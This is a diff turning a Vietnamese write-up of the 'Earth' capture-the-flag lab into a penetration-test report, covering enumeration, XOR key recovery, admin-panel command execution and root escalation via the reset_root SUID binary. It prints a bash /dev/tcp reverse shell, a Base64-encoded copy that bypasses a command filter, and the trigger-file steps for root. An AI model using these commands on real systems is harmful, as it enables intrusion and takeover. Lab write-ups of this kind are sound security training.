@@ -1,148 +1,596 @@
-Trước tiên dùng nmap để quét toàn bộ những cổng được mở trên server
-![img](img/nmap.png?raw=true)
-Có thể thấy hiện tại đang có 3 cổng được mở là 22 với ssh, 80 là http và 443 là https và 2 tên DNS là earth.local và terratest.earth.local. Khả năng hai trang web sẽ được lưu trữ trên cùng một máy chủ, vì thế cần thêm các tên này vào tệp hosts để có thể sử dụng chúng trên trình duyệt web và truy cập vào các trang web mong muốn
-![img](img/port%2080.png?raw=true)
-Khi truy cập https://terratest.earth.local, trang web chỉ hiện dòng chữ "Test site, please ignore." Không có gì có thể giúp ích nên chúng ta sẽ tập trung vào earth.local. Nhưng trước tiên hãy thử dùng gobuster để xem có thể thấy những gì ở trên 2 trang này
-![img](img/gobuster80.png?raw=true)
-![img](img/gobuster443.png?raw=true)
-Có thể thấy một path khá chú ý là /admin ở phía cổng 80 và /robots.txt ở phía cổng 443
+# SECURITY ASSESSMENT REPORT – EARTH LAB
+
+## 1. Tổng quan
+
+### 1.1. Thông tin mục tiêu
+
+| Thông tin       | Giá trị                                             |
+| --------------- | --------------------------------------------------- |
+| Target          | `192.168.196.129`                                   |
+| Domain          | `earth.local`                                       |
+| Subdomain       | `terratest.earth.local`                             |
+| Assessment Type | Black-box Penetration Testing                       |
+| Objective       | Gain initial access and escalate privileges to root |
+
+### 1.2. Tóm tắt
+
+Quá trình kiểm thử bắt đầu bằng reconnaissance và enumeration trên mục tiêu. Kết quả cho thấy hệ thống cung cấp các dịch vụ SSH, HTTP và HTTPS.
+
+Trong quá trình kiểm tra web application, thông tin nhạy cảm được phát hiện thông qua `robots.txt` và file `testingnotes.txt`. Các thông tin này dẫn đến việc phát hiện cơ chế mã hóa XOR và username của admin portal.
+
+Sau khi phân tích dữ liệu được mã hóa và xác định được key, có thể đăng nhập vào admin portal và khai thác chức năng command execution để đạt được quyền thực thi lệnh dưới tài khoản `apache`.
+
+Tiếp theo, quá trình enumeration local system phát hiện một SUID binary có tên `reset_root`. Phân tích reverse engineering cho thấy binary chứa cơ chế reset mật khẩu root dựa trên sự tồn tại của ba file đặc biệt. Việc tạo các file này và thực thi binary cho phép thay đổi mật khẩu root, từ đó đạt được quyền root trên hệ thống.
+
+---
+
+# 2. Reconnaissance
+
+## 2.1. Port Scanning
+
+Thực hiện quét toàn bộ TCP port:
+
+```bash
+nmap -p- -sC -sV 192.168.196.129
 ```
-User-Agent: *
-Disallow: /*.asp
-Disallow: /*.aspx
-Disallow: /*.bat
-Disallow: /*.c
-Disallow: /*.cfm
-Disallow: /*.cgi
-Disallow: /*.com
-Disallow: /*.dll
-Disallow: /*.exe
-Disallow: /*.htm
-Disallow: /*.html
-Disallow: /*.inc
-Disallow: /*.jhtml
-Disallow: /*.jsa
-Disallow: /*.json
-Disallow: /*.jsp
-Disallow: /*.log
-Disallow: /*.mdb
-Disallow: /*.nsf
-Disallow: /*.php
-Disallow: /*.phtml
-Disallow: /*.pl
-Disallow: /*.reg
-Disallow: /*.sh
-Disallow: /*.shtml
-Disallow: /*.sql
-Disallow: /*.txt
-Disallow: /*.xml
+
+Kết quả xác định ba dịch vụ đang hoạt động:
+
+* `22/tcp` – SSH
+* `80/tcp` – HTTP
+* `443/tcp` – HTTPS
+
+![Nmap Scan](img/nmap.png?raw=true)
+
+**Hình 1.** Kết quả quét Nmap trên target.
+
+---
+
+## 2.2. Virtual Host Enumeration
+
+Trong quá trình kiểm tra HTTP service, phát hiện các domain:
+
+* `earth.local`
+* `terratest.earth.local`
+
+Các domain được thêm vào `/etc/hosts` để phục vụ quá trình kiểm thử.
+
+Truy cập `terratest.earth.local` cho thấy trang web chỉ chứa nội dung:
+
+```text
+Test site, please ignore.
+```
+
+![Terra Test](img/port%2080.png?raw=true)
+
+**Hình 2.** Nội dung của `terratest.earth.local`.
+
+---
+
+# 3. Web Enumeration
+
+## 3.1. Directory Enumeration
+
+Sử dụng Gobuster để tìm các endpoint và resource:
+
+```bash
+gobuster dir -u http://earth.local/ \
+-w /usr/share/dirb/wordlists/common.txt
+```
+
+Kết quả phát hiện endpoint đáng chú ý:
+
+```text
+/admin
+```
+
+![Gobuster HTTP](img/gobuster80.png?raw=true)
+
+**Hình 3.** Kết quả directory enumeration trên HTTP.
+
+Tiếp tục kiểm tra HTTPS:
+
+```bash
+gobuster dir -u https://earth.local/ \
+-w /usr/share/dirb/wordlists/common.txt
+```
+
+Phát hiện:
+
+```text
+/robots.txt
+```
+
+![Gobuster HTTPS](img/gobuster443.png?raw=true)
+
+**Hình 4.** Kết quả directory enumeration trên HTTPS.
+
+---
+
+# 4. Information Disclosure
+
+## 4.1. Phân tích robots.txt
+
+Truy cập:
+
+```text
+https://earth.local/robots.txt
+```
+
+File chứa nhiều rule `Disallow`, trong đó đáng chú ý:
+
+```text
 Disallow: /testingnotes.*
 ```
-Đây là những gì thu được ở robots.txt dòng cuối rất đáng chú ý khi phần extension của testingnote lại bị bỏ sót. Tôi đã thử các extension khác nhau và chỉ .txt ra kết quả
+
+Điều này cho thấy server có thể chứa resource bắt đầu bằng `testingnotes`.
+
+Sau khi thử các extension khác nhau, resource `testingnotes.txt` được phát hiện.
+
 ```
+User-Agent: *
+
+Disallow: /*.asp
+
+Disallow: /*.aspx
+
+Disallow: /*.bat
+
+Disallow: /*.c
+
+Disallow: /*.cfm
+
+Disallow: /*.cgi
+
+Disallow: /*.com
+
+Disallow: /*.dll
+
+Disallow: /*.exe
+
+Disallow: /*.htm
+
+Disallow: /*.html
+
+Disallow: /*.inc
+
+Disallow: /*.jhtml
+
+Disallow: /*.jsa
+
+Disallow: /*.json
+
+Disallow: /*.jsp
+
+Disallow: /*.log
+
+Disallow: /*.mdb
+
+Disallow: /*.nsf
+
+Disallow: /*.php
+
+Disallow: /*.phtml
+
+Disallow: /*.pl
+
+Disallow: /*.reg
+
+Disallow: /*.sh
+
+Disallow: /*.shtml
+
+Disallow: /*.sql
+
+Disallow: /*.txt
+
+Disallow: /*.xml
+
+Disallow: /testingnotes.*
+```
+
+Truy cập:
+
+```text
+https://earth.local/testingnotes.txt
+```
+
+thu được:
+
+```text
 Testing secure messaging system notes:
+
 *Using XOR encryption as the algorithm, should be safe as used in RSA.
 *Earth has confirmed they have received our sent messages.
 *testdata.txt was used to test encryption.
 *terra used as username for admin portal.
+
 Todo:
 *How do we send our monthly keys to Earth securely? Or should we change keys weekly?
 *Need to test different key lengths to protect against bruteforce. How long should the key be?
 *Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
 ```
-Có thể thấy một vài thông tin rất quan trọng:
-- Hệ thống sử dụng thuật toán XOR để mã hóa tin nhắn.
-- testdata.txt là file được sử dụng để kiểm thử chức năng mã hóa. Đây là một filename đáng chú ý vì có thể tồn tại trên web server và chứa plaintext/ciphertext mẫu, từ đó giúp phân tích cách XOR được sử dụng.
 
-Username terra dùng để đăng nhập trang /admin
-Thử truy cập vào testdata.txt để kiểm tra
-```
-According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
-```
-Đây có thể là khóa hoặc thông điệp của thuật toán XOR. Thêm vào đó ta nhận được đoạn mã hóa thu được từ trang earth.local. Sử dụng cyberchef để thực hiện giải mã thuật toán này
-![img](img/cyberchef1.png?raw=true)
-Ta có thể thấy cụm "earthclimatechangebad4humans" lặp lại khá nhiều đây có thể là khóa để mã hóa hoặc có thể là một password để đăng nhập trang admin. Sau khi thử mã hóa ngược lại đã thu được message lúc đầu
-![img](img/cyberchef2.png?raw=true)
-Sau khi thử nhập bằng username là terra và password vừa tìm được, tôi đã đăng nhập thành công
-![img](img/loginsuccess.png?raw=true)
-Sau khi quan sát tôi nhận thấy đây có thể trang web này cho phép thực thi lệnh và khi thử lệnh whoami thì web đã trả về kết quả apache
-![img](img/whoami.png?raw=true)
-# user_flag
-Giờ thì thực hiện tìm flag1 bằng lệnh:
-**find / -name "user_flag.txt"** để tìm đường dẫn đến kết quả sau đó đọc file ở đường dẫn tìm được này 
-![img](img/user_flag.png?raw=true)
-# root_flag
-Chúng ta sẽ thử tìm đường dẫn của root_flag tuy nhiên trang web không trả kết quả gì về. Tiếp theo có thể thử thực hiện ssh vào máy chủ tức là sẽ dùng trang admin này để reverse shell. Sau khi kiểm tra lệnh bash trên máy chủ đã có sẵn và có thể thực hiện 
-![img](img/bash.png?raw=true)
-Tuy nhiên tôi lại nhận response của trang web rằng "Remote connections are forbidden." có lẽ có cơ chế phân tích văn bản đầu vào để tìm địa chỉ IP hay gì đó tương tự. Hãy thử chuyển sang dạng base64 và thực hiện lại với lệnh: 
+Thông tin này làm lộ:
 
-```echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ni4xMjgvMTIzNCAwPiYx" | base64 -d | bash```
-![img](img/rce.png?raw=true)
-Đã thực hiện thành công. Sau đó có thể thực hiện kiểm tra xem có tập tin nào được thiết lập bit SUID hay không
-![img](img/find.png?raw=true)
-Và có thể quan sát thấy một tập tin khá đáng chú ý là `reset_root`. Tôi đã thực hiện kiểm tra file này đây là một file ELF64 và chạy dưới quyền root, tôi sẽ tải file này về và thực hiện phân tích 
+* Ứng dụng sử dụng XOR để mã hóa dữ liệu.
+* `testdata.txt` được sử dụng để kiểm thử encryption.
+* Username của admin portal là `terra`.
+* Hệ thống có một admin panel.
 
-Sau khi sử dụng IDA để phân tích tôi đã thu được một mã giả
+Đây là một dạng **Information Disclosure** do các file chứa thông tin nội bộ có thể truy cập trực tiếp từ web server.
+
+---
+
+# 5. Phân tích cơ chế mã hóa
+
+## 5.1. Thu thập dữ liệu
+
+Truy cập `testdata.txt` để thu thập dữ liệu phục vụ quá trình phân tích encryption.
+
+![Test Data](img/cyberchef1.png?raw=true)
+
+**Hình 5.** Dữ liệu được sử dụng trong quá trình phân tích XOR.
+
+Tiếp tục kiểm tra ciphertext trên `earth.local` và sử dụng CyberChef để phân tích.
+
+Trong quá trình thử nghiệm, phát hiện chuỗi:
+
+```text
+earthclimatechangebad4humans
 ```
-int __fastcall main(int argc, const char **argv, const char **envp)
+
+có khả năng được sử dụng làm XOR key/password.
+
+![CyberChef](img/cyberchef1.png?raw=true)
+
+**Hình 6.** Phân tích ciphertext bằng CyberChef.
+
+Sử dụng key trên để giải mã ciphertext thu được plaintext.
+
+![Decrypted Message](img/cyberchef2.png?raw=true)
+
+**Hình 7.** Kết quả giải mã thành công.
+
+Kết quả cho thấy key có thể được sử dụng để truy cập admin portal.
+
+---
+
+# 6. Compromise Admin Portal
+
+Truy cập:
+
+```text
+http://earth.local/admin
+```
+
+Sử dụng thông tin:
+
+```text
+Username: terra
+Password: earthclimatechangebad4humans
+```
+
+Đăng nhập thành công.
+
+![Admin Login](img/loginsuccess.png?raw=true)
+
+**Hình 8.** Đăng nhập thành công vào admin portal.
+
+Việc thông tin xác thực có thể được suy ra từ các resource public cho thấy hệ thống có vấn đề về **credential disclosure và credential management**.
+
+---
+
+# 7. Remote Command Execution
+
+Admin panel cung cấp chức năng thực thi command trên server.
+
+Thử thực hiện:
+
+```bash
+whoami
+```
+
+Kết quả:
+
+```text
+apache
+```
+
+![Command Execution](img/whoami.png?raw=true)
+
+**Hình 9.** Command được thực thi dưới quyền `apache`.
+
+Điều này cho thấy attacker đã đạt được khả năng **Remote Command Execution (RCE)** trên server.
+
+---
+
+# 8. Obtaining User Flag
+
+Sau khi có command execution, tiến hành tìm user flag:
+
+```bash
+find / -name "user_flag.txt" 2>/dev/null
+```
+
+![User Flag](img/user_flag.png?raw=true)
+
+**Hình 10.** Tìm thấy user flag trên hệ thống.
+
+User flag được truy cập thành công dưới quyền `apache`.
+
+---
+
+# 9. Reverse Shell
+
+Thử thiết lập reverse shell bằng Bash:
+
+```bash
+bash -i >& /dev/tcp/192.168.196.129/1234 0>&1
+```
+
+Tuy nhiên command bị chặn với thông báo:
+
+```text
+Remote connections are forbidden.
+```
+
+![Blocked Reverse Shell](img/bash.png?raw=true)
+
+**Hình 11.** Reverse shell bị chặn bởi command filter.
+
+Để kiểm tra khả năng bypass filter, command được encode bằng Base64:
+
+```bash
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ni4xMjgvMTIzNCAwPiYx" | base64 -d | bash
+```
+
+Sau khi decode và thực thi, reverse shell được thiết lập thành công.
+
+![Reverse Shell](img/rce.png?raw=true)
+
+**Hình 12.** Bypass command filter và đạt được reverse shell.
+
+Điều này cho thấy cơ chế command filtering hiện tại chỉ dựa trên việc phát hiện một số chuỗi nguy hiểm và có thể bị bypass thông qua encoding.
+
+---
+
+# 10. Privilege Escalation
+
+Sau khi có shell, tiến hành kiểm tra các file có SUID bit:
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Kết quả phát hiện binary:
+
+```text
+/usr/bin/reset_root
+```
+
+![SUID Enumeration](img/find.png?raw=true)
+
+**Hình 13.** Phát hiện `reset_root` trong danh sách SUID binary.
+
+Binary được tải về và phân tích bằng IDA.
+
+---
+
+# 11. Phân tích binary reset_root
+
+Phân tích binary cho thấy chương trình chứa các chuỗi và dữ liệu được mã hóa.
+
+Một đoạn đáng chú ý:
+
+```c
+strcpy(v12, "credentials root:theEarthisflat");
+```
+
+Ngoài ra, chương trình sử dụng hàm:
+
+```c
+magic_cipher()
+```
+
+để giải mã dữ liệu được hardcode trong binary.
+
+---
+
+# 12. Phân tích hàm magic_cipher
+
+Hàm được decompile thành:
+
+```c
+__int64 __fastcall magic_cipher(
+    __int64 a1,
+    __int64 a2,
+    __int64 a3,
+    signed int a4,
+    int a5)
 {
-  __int64 v4; // [rsp+3h] [rbp-10BDh] BYREF
-  char v5[5]; // [rsp+Bh] [rbp-10B5h] BYREF
-  _QWORD v6[2]; // [rsp+10h] [rbp-10B0h] BYREF
-  char v7; // [rsp+20h] [rbp-10A0h]
-  __int64 v8[2]; // [rsp+30h] [rbp-1090h] BYREF
-  char v9; // [rsp+40h] [rbp-1080h]
-  char name[17]; // [rsp+50h] [rbp-1070h] BYREF
-  char v11; // [rsp+61h] [rbp-105Fh]
-  char v12[32]; // [rsp+1050h] [rbp-70h] BYREF
-  char v13[32]; // [rsp+1070h] [rbp-50h] BYREF
-  __int64 v14[2]; // [rsp+1090h] [rbp-30h] BYREF
-  char v15; // [rsp+10A0h] [rbp-20h]
-  _DWORD v16[4]; // [rsp+10B0h] [rbp-10h] BYREF
+  for (i = 0; i < a4; ++i)
+    *(_BYTE *)(i + a3) =
+        *(_BYTE *)(i + a1) ^
+        *(_BYTE *)(i % (a5 - 1) + a2);
 
-  strcpy((char *)v16, "palebluedot");
-  v14[0] = 0x810190E07090904LL;
-  v14[1] = 0x555C5D041C161D05LL;
-  v15 = 94;
-  strcpy(v12, "credentials root:theEarthisflat");
-  v16[3] = 0;
-  v8[0] = 0xD064314000C5BLL;
-  v8[1] = 0x27077310B2A194ELL;
-  v9 = 117;
-  v6[0] = 0xD064314000C5BLL;
-  v6[1] = 0x620067075B15284ELL;
-  v7 = 7;
-  v4 = 0x20061E4312081C5BLL;
-  strcpy(v5, "Q%\a\x1B");
-  magic_cipher(v14, v16, v13, 17LL, 12LL);
-  v13[17] = 0;
-  puts("CHECKING IF RESET TRIGGERS PRESENT...");
-  magic_cipher(v8, v13, name, 17LL, 18LL);
-  v11 = 0;
-  if ( !access(name, 0) )
-    ++v16[3];
-  magic_cipher(v6, v13, name, 17LL, 18LL);
-  v11 = 0;
-  if ( !access(name, 0) )
-    ++v16[3];
-  magic_cipher(&v4, v13, name, 13LL, 18LL);
-  name[13] = 0;
-  if ( !access(name, 0) )
-    ++v16[3];
-  if ( v16[3] == 3 )
-  {
-    puts("RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth");
-    setuid(0);
-    system("/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd");
-  }
-  else
-  {
-    puts("RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.");
-  }
-  return 0;
+  return i;
 }
 ```
-Sau khi phân tích binary, có thể thấy chương trình sử dụng hàm `magic_cipher()` để giải mã dữ liệu bằng phép XOR. Kết quả giải mã đầu tiên được sử dụng làm key để tiếp tục giải mã ba chuỗi khác, tương ứng với ba file/path đóng vai trò là **reset trigger**. Chương trình dùng `access()` để kiểm tra sự tồn tại của từng trigger và chỉ khi cả ba đều tồn tại thì cơ chế reset mới được kích hoạt. Khi đó, chương trình gọi `setuid(0)` và sử dụng `chpasswd` để thay đổi mật khẩu tài khoản `root` thành `Earth`. Ngoài ra, binary cũng chứa chuỗi `credentials root:theEarthisflat`, cho thấy thông tin liên quan đến tài khoản root được lưu trực tiếp trong chương trình.
-![img](img/ltrace.png?raw=true)
-Sử dụng ltrace để theo dõi các lời gọi access(), tôi xác định được chương trình kiểm tra sự tồn tại của ba file /dev/shm/kHgTFI5G, /dev/shm/Zw7bV9U5 và /tmp/kcM0Wewe. Khi cả ba file tồn tại, biến đếm đạt giá trị 3 và kích hoạt cơ chế reset password, trong đó mật khẩu tài khoản root được thay đổi thành Earth. Giờ chỉ cần tạo 3 file này trên hệ thống và chạy reset_root để đổi password của root và chúng ta sẽ có quyền root
-![img](img/root.png?raw=true)
+
+Có thể xác định đây là cơ chế XOR:
+
+```text
+plaintext[i] = ciphertext[i] XOR key[i % key_length]
+```
+
+Chương trình trước tiên giải mã một chuỗi để tạo key, sau đó sử dụng key này để giải mã ba chuỗi tiếp theo.
+
+Ba chuỗi được giải mã chính là các file/path được sử dụng làm **reset trigger**.
+
+---
+
+# 13. Xác định Reset Trigger
+
+Để quan sát hành vi runtime của binary, sử dụng:
+
+```bash
+ltrace ./reset_root
+```
+
+Kết quả:
+
+```text
+access("/dev/shm/kHgTFI5G", 0) = -1
+access("/dev/shm/Zw7bV9U5", 0) = -1
+access("/tmp/kcM0Wewe", 0) = -1
+```
+
+![Ltrace](img/ltrace.png?raw=true)
+
+**Hình 14.** `ltrace` cho thấy ba reset trigger được kiểm tra.
+
+Ba file cần tồn tại là:
+
+```text
+/dev/shm/kHgTFI5G
+/dev/shm/Zw7bV9U5
+/tmp/kcM0Wewe
+```
+
+Giá trị trả về `-1` của `access()` cho thấy các file chưa tồn tại.
+
+---
+
+# 14. Root Privilege Escalation
+
+Tạo ba file trigger:
+
+```bash
+touch /dev/shm/kHgTFI5G
+touch /dev/shm/Zw7bV9U5
+touch /tmp/kcM0Wewe
+```
+
+Sau đó thực thi:
+
+```bash
+./reset_root
+```
+
+Khi cả ba trigger tồn tại, chương trình hiển thị:
+
+```text
+RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
+```
+
+![Root Reset](img/root.png?raw=true)
+
+**Hình 15.** Binary thực hiện reset root password.
+
+Từ source đã reverse engineer, chương trình thực hiện:
+
+```c
+setuid(0);
+system("/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd");
+```
+
+Do đó, mật khẩu tài khoản `root` được thay đổi thành:
+
+```text
+Earth
+```
+
+Sau đó đăng nhập với tài khoản root và xác nhận quyền:
+
+```bash
+whoami
+```
+
+Kết quả:
+
+```text
+root
+```
+
+Như vậy, quá trình privilege escalation hoàn tất.
+
+---
+
+# 15. Attack Chain
+
+```text
+Network Enumeration
+        ↓
+HTTP/HTTPS Enumeration
+        ↓
+robots.txt
+        ↓
+testingnotes.txt
+        ↓
+Information Disclosure
+        ↓
+XOR Analysis
+        ↓
+Recover Credential
+        ↓
+Admin Portal
+        ↓
+Command Execution
+        ↓
+apache shell
+        ↓
+SUID Enumeration
+        ↓
+reset_root
+        ↓
+Reverse Engineering
+        ↓
+Discover 3 Reset Triggers
+        ↓
+Create Trigger Files
+        ↓
+reset_root
+        ↓
+Root Password Reset
+        ↓
+ROOT
+```
+
+---
+
+# 16. Security Impact
+
+Các vấn đề phát hiện trong quá trình kiểm thử có thể dẫn đến compromise toàn bộ hệ thống:
+
+### Information Disclosure
+
+Các file như `robots.txt` và `testingnotes.txt` làm lộ thông tin nội bộ, username và thông tin liên quan đến cơ chế encryption.
+
+### Weak Credential Management
+
+Thông tin dùng để truy cập admin portal có thể được suy ra từ dữ liệu public và cơ chế XOR yếu.
+
+### Remote Command Execution
+
+Admin panel cho phép thực thi command trực tiếp trên server.
+
+### Insufficient Command Filtering
+
+Cơ chế blacklist command có thể bị bypass thông qua Base64 encoding.
+
+### Dangerous SUID Binary
+
+`reset_root` là SUID binary owned by root và chứa chức năng thay đổi mật khẩu root dựa trên các file trigger có thể được tạo bởi user có quyền thấp.
+
+### Hardcoded Root Password
+
+Root password được hardcode trực tiếp trong binary:
+
+```text
+root:Earth
+```
+
+Điều này tạo ra nguy cơ compromise toàn bộ hệ thống.
+
+---
